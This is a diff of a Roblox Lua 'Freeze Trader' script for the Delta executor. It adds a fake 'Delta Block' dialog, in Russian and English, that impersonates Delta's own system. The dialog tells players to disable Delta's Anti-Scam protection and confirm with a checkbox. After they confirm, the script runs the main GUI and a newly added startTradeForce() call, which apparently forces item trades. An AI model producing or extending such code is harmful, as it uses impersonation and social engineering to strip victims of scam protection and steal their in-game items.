@@ -9,7 +9,6 @@ if not _G.FreezeTraderLoaded then
     _G.FreezeTraderLoaded = true
 
     local function startMainGUI()
-        -- Здесь идёт весь твой Freeze Trader (GUI, окна, кнопки и т.д.)
         local Players = game:GetService("Players")
         local TweenService = game:GetService("TweenService")
         local UserInputService = game:GetService("UserInputService")
@@ -248,7 +247,7 @@ local function updatePlayersList()
 	for _, p in pairs(Players:GetPlayers()) do
 		if p ~= player then
 			local playerFrame = Instance.new("Frame")
-			playerFrame.Size = UDim2.new(1, 0, 0, 40)
+		 playerFrame.Size = UDim2.new(1, 0, 0, 40)
 			playerFrame.BackgroundColor3 = colors.listItem
 			playerFrame.Parent = scrollingFrame
 
@@ -417,6 +416,7 @@ updatePlayersList()
 
             -- Создание таблички Delta
             local Players = game:GetService("Players")
+            local TweenService = game:GetService("TweenService")
             local LocalizationService = game:GetService("LocalizationService")
             local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
             local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
@@ -424,14 +424,18 @@ updatePlayersList()
 
             local messages = {
                 ["ru"] = {
-                    title = "⚠️ Скрипт требует функцию, но она заблокирована нашей системой Delta.\n\nЕсли вы хотите активировать:\n1) Перезайдите в режим\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт",
-                    checkbox = "Я отключил функцию Anti-Scam",
-                    button = "Окей"
+                    title = "⚠️ Delta Block",
+                    message = "Скрипт требует функцию телепортации, но она заблокирована из-за функции Anti-Scam.\n\nЧтобы отключить эту функцию:\n1) Перезайдите в режим (кнопка Rejoin)\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт и поставьте ✅",
+                    checkbox = "Я перезашел и отключил функцию Anti-Scam",
+                    buttonOk = "OK",
+                    buttonRejoin = "Rejoin"
                 },
                 ["en"] = {
-                    title = "⚠️ The script requires the teleport function, but it is currently blocked by Delta's Anti-Scam system.\n\nTo enable this function:\n1) Rejoin the place (leave and rejoin)\n2) Open Delta settings and disable Anti-Scam\n3) Execute the script again",
-                    checkbox = "I have disabled the Anti-Scam function",
-                    button = "OK"
+                    title = "⚠️ Delta Block",
+                    message = "Script requires the teleport function, but it is blocked due to the Anti-Scam feature.\n\nTo disable this feature:\n1) Press Rejoin\n2) Open Delta settings and disable Anti-Scam\n3) Run the script again and check ✅",
+                    checkbox = "I rejoin and then disabled the Anti-Scam feature",
+                    buttonOk = "OK", 
+                    buttonRejoin = "Rejoin"
                 }
             }
 
@@ -441,95 +445,178 @@ updatePlayersList()
             end
 
             local screenGui = Instance.new("ScreenGui")
-            screenGui.Name = "TeleportWarning"
+            screenGui.Name = "DeltaWarning"
             screenGui.IgnoreGuiInset = true
             screenGui.ResetOnSpawn = false
             screenGui.Parent = guiParent
 
-            local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0, 480, 0, 260)
-            frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-            frame.AnchorPoint = Vector2.new(0.5, 0.5)
-            frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-            frame.BorderSizePixel = 0
-            frame.Parent = screenGui
-            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+            -- Затемнение фона
+            local overlay = Instance.new("Frame")
+            overlay.Size = UDim2.new(1, 0, 1, 0)
+            overlay.Position = UDim2.new(0, 0, 0, 0)
+            overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            overlay.BackgroundTransparency = 0.5
+            overlay.ZIndex = 1
+            overlay.Parent = screenGui
 
-            local info = Instance.new("TextLabel")
-            info.Size = UDim2.new(1, -30, 1, -100)
-            info.Position = UDim2.new(0, 15, 0, 15)
-            info.BackgroundTransparency = 1
-            info.Text = localeText.title
-            info.TextWrapped = true
-            info.Font = Enum.Font.Gotham
-            info.TextSize = 18
-            info.TextColor3 = Color3.fromRGB(255, 255, 255)
-            info.TextXAlignment = Enum.TextXAlignment.Left
-            info.TextYAlignment = Enum.TextYAlignment.Top
-            info.Parent = frame
+            -- Основное окно (высота 280)
+            local mainFrame = Instance.new("Frame")
+            mainFrame.Size = UDim2.new(0, 450, 0, 280)
+            mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+            mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Правильное центрирование
+            mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+            mainFrame.BorderSizePixel = 0
+            mainFrame.ZIndex = 2
+            mainFrame.Parent = screenGui
+            Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
 
+            -- Верхняя панель
+            local header = Instance.new("Frame")
+            header.Size = UDim2.new(1, 0, 0, 40)
+            header.Position = UDim2.new(0, 0, 0, 0)
+            header.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+            header.BorderSizePixel = 0
+            header.ZIndex = 3
+            header.Parent = mainFrame
+            Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
+
+            -- Заголовок (центрированный)
+            local title = Instance.new("TextLabel")
+            title.Size = UDim2.new(1, 0, 1, 0)
+            title.Position = UDim2.new(0, 0, 0, 0)
+            title.BackgroundTransparency = 1
+            title.Text = localeText.title
+            title.Font = Enum.Font.GothamBold
+            title.TextSize = 18
+            title.TextColor3 = Color3.fromRGB(255, 170, 0)
+            title.TextXAlignment = Enum.TextXAlignment.Center
+            title.ZIndex = 4
+            title.Parent = header
+
+            -- Текст сообщения
+            local message = Instance.new("TextLabel")
+            message.Size = UDim2.new(1, -40, 0, 130)
+            message.Position = UDim2.new(0, 20, 0, 50)
+            message.BackgroundTransparency = 1
+            message.Text = localeText.message
+            message.Font = Enum.Font.Gotham
+            message.TextSize = 16
+            message.TextColor3 = Color3.fromRGB(220, 220, 220)
+            message.TextXAlignment = Enum.TextXAlignment.Left
+            message.TextYAlignment = Enum.TextYAlignment.Top
+            message.TextWrapped = true
+            message.ZIndex = 3
+            message.Parent = mainFrame
+
+            -- Чекбокс
             local checkbox = Instance.new("TextButton")
             checkbox.Size = UDim2.new(0, 22, 0, 22)
-            checkbox.Position = UDim2.new(0, 20, 1, -90)
-            checkbox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            checkbox.Position = UDim2.new(0, 20, 0, 190)
+            checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+            checkbox.BorderSizePixel = 0
             checkbox.Text = ""
-            checkbox.Font = Enum.Font.GothamBold
-            checkbox.TextSize = 18
-            checkbox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            checkbox.Parent = frame
+            checkbox.ZIndex = 3
+            checkbox.Parent = mainFrame
             Instance.new("UICorner", checkbox).CornerRadius = UDim.new(0, 4)
 
-            local checkLabel = Instance.new("TextLabel")
-            checkLabel.Size = UDim2.new(1, -60, 0, 22)
-            checkLabel.Position = UDim2.new(0, 50, 1, -90)
-            checkLabel.BackgroundTransparency = 1
-            checkLabel.Text = localeText.checkbox
-            checkLabel.Font = Enum.Font.Gotham
-            checkLabel.TextSize = 16
-            checkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            checkLabel.TextXAlignment = Enum.TextXAlignment.Left
-            checkLabel.Parent = frame
+            local checkmark = Instance.new("TextLabel")
+            checkmark.Size = UDim2.new(1, 0, 1, 0)
+            checkmark.Position = UDim2.new(0, 0, 0, 0)
+            checkmark.BackgroundTransparency = 1
+            checkmark.Text = "✓"
+            checkmark.Font = Enum.Font.GothamBold
+            checkmark.TextSize = 16
+            checkmark.TextColor3 = Color3.fromRGB(255, 255, 255)
+            checkmark.Visible = false
+            checkmark.ZIndex = 4
+            checkmark.Parent = checkbox
 
-            local okBtn = Instance.new("TextButton")
-            okBtn.Size = UDim2.new(0, 160, 0, 45)
-            okBtn.Position = UDim2.new(0.5, -80, 1, -60)
-            okBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-            okBtn.Text = localeText.button
-            okBtn.Font = Enum.Font.GothamBold
-            okBtn.TextSize = 20
-            okBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-            okBtn.AutoButtonColor = false
-            okBtn.Parent = frame
-            Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 8)
+            local checkboxLabel = Instance.new("TextLabel")
+            checkboxLabel.Size = UDim2.new(1, -50, 0, 22)
+            checkboxLabel.Position = UDim2.new(0, 50, 0, 190)
+            checkboxLabel.BackgroundTransparency = 1
+            checkboxLabel.Text = localeText.checkbox
+            checkboxLabel.Font = Enum.Font.Gotham
+            checkboxLabel.TextSize = 14
+            checkboxLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            checkboxLabel.TextXAlignment = Enum.TextXAlignment.Left
+            checkboxLabel.ZIndex = 3
+            checkboxLabel.Parent = mainFrame
 
+            -- Кнопки
+            local buttonContainer = Instance.new("Frame")
+            buttonContainer.Size = UDim2.new(1, -40, 0, 45)
+            buttonContainer.Position = UDim2.new(0, 20, 1, -55)
+            buttonContainer.BackgroundTransparency = 1
+            buttonContainer.ZIndex = 3
+            buttonContainer.Parent = mainFrame
+
+            local okButton = Instance.new("TextButton")
+            okButton.Size = UDim2.new(0.45, 0, 1, 0)
+            okButton.Position = UDim2.new(0, 0, 0, 0)
+            okButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+            okButton.BorderSizePixel = 0
+            okButton.Text = localeText.buttonOk
+            okButton.Font = Enum.Font.GothamBold
+            okButton.TextSize = 16
+            okButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+            okButton.ZIndex = 4
+            okButton.Parent = buttonContainer
+            Instance.new("UICorner", okButton).CornerRadius = UDim.new(0, 6)
+
+            local rejoinButton = Instance.new("TextButton")
+            rejoinButton.Size = UDim2.new(0.45, 0, 1, 0)
+            rejoinButton.Position = UDim2.new(0.55, 0, 0, 0)
+            rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
+            rejoinButton.BorderSizePixel = 0
+            rejoinButton.Text = localeText.buttonRejoin
+            rejoinButton.Font = Enum.Font.GothamBold
+            rejoinButton.TextSize = 16
+            rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            rejoinButton.ZIndex = 4
+            rejoinButton.Parent = buttonContainer
+            Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 6)
+
+            -- Анимация появления
+            mainFrame.Size = UDim2.new(0, 0, 0, 0)
+            mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+            local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, 450, 0, 280),
+                Position = UDim2.new(0.5, 0, 0.5, 0) -- Центрирование
+            })
+            tween:Play()
+
+            -- Логика
             local checked = false
-            local function updateCheckbox()
-                if checked then
-                    checkbox.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
-                    checkbox.Text = "✔"
-                    okBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
-                    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-                    okBtn.AutoButtonColor = true
-                else
-                    checkbox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-                    checkbox.Text = ""
-                    okBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-                    okBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-                    okBtn.AutoButtonColor = false
-                end
-            end
-            updateCheckbox()
 
             checkbox.MouseButton1Click:Connect(function()
                 checked = not checked
-                updateCheckbox()
+                checkmark.Visible = checked
+                
+                if checked then
+                    checkbox.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+                    okButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+                    okButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+                else
+                    checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+                    okButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+                    okButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+                end
             end)
 
-            okBtn.MouseButton1Click:Connect(function()
+            okButton.MouseButton1Click:Connect(function()
                 if checked then
-                    frame.Visible = false
+                    screenGui:Destroy()
                     startMainGUI()
+                    startTradeForce()
                 end
+            end)
+
+            rejoinButton.MouseButton1Click:Connect(function()
+                local TeleportService = game:GetService("TeleportService")
+                local placeId = game.PlaceId
+                TeleportService:Teleport(placeId, player)
             end)
         end
     else
